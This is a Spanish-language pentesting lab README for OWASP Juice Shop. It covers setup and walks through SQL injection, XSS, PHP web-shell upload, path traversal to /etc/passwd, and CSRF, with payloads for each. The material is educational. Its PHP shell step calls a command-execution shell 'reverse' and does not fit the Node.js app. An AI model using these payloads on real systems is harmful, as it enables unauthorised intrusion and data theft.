
## **📌- Penetration Testing OWASP Juice Shop**  

```md
# 🔥 Penetration Testing - OWASP Juice Shop  

🚀 **Descripción**  
Este proyecto documenta la evaluación de seguridad de una aplicación web vulnerable: **OWASP Juice Shop**. Utilizando **Kali Linux** y herramientas de pentesting, realizaremos pruebas para identificar y explotar vulnerabilidades **comunes en aplicaciones web** como **SQL Injection, XSS, CSRF y File Upload Exploits**.  

📌 **Objetivos del Proyecto:**  
✅ Aprender a realizar pentesting en una aplicación web real.  
✅ Identificar y explotar vulnerabilidades usando herramientas especializadas.  
✅ Entender cómo proteger aplicaciones contra ataques comunes.  

---

## **🛠️ Lab Set-up y Herramientas**  

### 📌 **Arquitectura del Laboratorio**  
```
+------------------+        +------------------+
|   Attacker       |  ----> |  Vulnerable App  |
|  (Kali Linux)    |        |  OWASP JuiceShop |
|  192.168.1.100   |        |  192.168.1.200   |
+------------------+        +------------------+
```

### 🔧 **Herramientas Utilizadas**  
✅ **Kali Linux** → Distribución para pentesting.  
✅ **OWASP Juice Shop** → Aplicación web vulnerable para pruebas.  
✅ **Burp Suite** → Proxy de análisis de tráfico HTTP.  
✅ **Nmap** → Escaneo de puertos y servicios.  
✅ **Docker** → Para desplegar Juice Shop de forma rápida.  

---

## **📌 Instalación de OWASP Juice Shop**  
### **1️⃣ Instalar Docker en Kali Linux**  
```bash
sudo apt update && sudo apt install docker.io -y
sudo systemctl start docker
sudo systemctl enable docker
```
### **2️⃣ Descargar y Ejecutar Juice Shop**  
```bash
sudo docker pull bkimminich/juice-shop
sudo docker run -d -p 3000:3000 bkimminich/juice-shop
```
🔹 **Accede a la aplicación en:** `http://localhost:3000`  

---

## **📌 Tareas de Pentesting**  

### **🕵️ Task 1: Identificación de Puertos Abiertos**
```bash
nmap -p- -sV 192.168.1.200
```
✅ **Objetivo:** Identificar servicios expuestos y posibles vectores de ataque.  

---

### **🛠️ Task 2: SQL Injection**  
📌 **Explotar autenticación vulnerable mediante SQL Injection**  
1️⃣ **Abrir Burp Suite** y configurar el navegador para proxy (127.0.0.1:8080).  
2️⃣ **Interceptar una solicitud de login**.  
3️⃣ **Inyectar payload en el usuario y contraseña:**  
```sql
' OR '1'='1 -- 
```
✅ **Resultado Esperado:** Acceso como administrador sin credenciales válidas.  

---

### **⚠️ Task 3: Cross-Site Scripting (XSS)**  
📌 **Ejecutar código JavaScript malicioso en la aplicación**  
1️⃣ **Buscar un campo vulnerable (Ej: Barra de búsqueda)**.  
2️⃣ **Inyectar este payload:**  
```html
<script>alert('XSS')</script>
```
✅ **Resultado Esperado:** Aparece un `alert()` en la página, confirmando la vulnerabilidad.  

---

### **📂 Task 4: Explotación de Subida de Archivos**  
📌 **Subir un archivo malicioso para obtener ejecución remota**  
1️⃣ **Ir a la sección de carga de imágenes de perfil.**  
2️⃣ **Subir un archivo `.php` con un shell inverso:**  
```php
<?php system($_GET['cmd']); ?>
```
3️⃣ **Intentar ejecutar comandos en el servidor:**  
```bash
curl http://192.168.1.200/uploads/shell.php?cmd=id
```
✅ **Resultado Esperado:** Ejecución remota de comandos en el servidor.  

---

### **📁 Task 5: Directory Traversal**  
📌 **Acceder a archivos internos del servidor**  
1️⃣ **Interceptar una solicitud en Burp Suite**.  
2️⃣ **Modificar la ruta del archivo solicitado para intentar acceder a `/etc/passwd`:**  
```bash
../../../etc/passwd
```
✅ **Resultado Esperado:** Acceso a archivos restringidos fuera del directorio web.  

---

### **🌐 Task 6: Cross-Site Request Forgery (CSRF)**  
📌 **Forzar a un usuario autenticado a realizar una acción sin su consentimiento**  
1️⃣ **Crear una página maliciosa con este código:**  
```html
<form action="http://192.168.1.200/change-email" method="POST">
   <input type="hidden" name="email" value="hacker@malicioso.com">
   <input type="submit" value="Actualizar Email">
</form>
```
2️⃣ **Si la víctima autenticada accede, su correo será cambiado sin su permiso.**  
✅ **Resultado Esperado:** CSRF exitoso, correo modificado sin autenticación adicional.  

---

## **📚 Recursos Adicionales**  
📌 **[OWASP Juice Shop Docs](https://owasp.org/www-project-juice-shop/)**  
📌 **[Burp Suite Web Security Academy](https://portswigger.net/web-security)**  
📌 **[Kali Linux Documentation](https://www.kali.org/docs/)**  

---

## **📌 Conclusión**  
🎯 **Este proyecto demuestra cómo realizar pruebas de seguridad en aplicaciones web.**  
💡 **Aprendimos a identificar y explotar vulnerabilidades en OWASP Juice Shop.**  
📌 **Estos ataques pueden prevenirse con WAFs, validación de entrada y hardening del servidor.**  



---


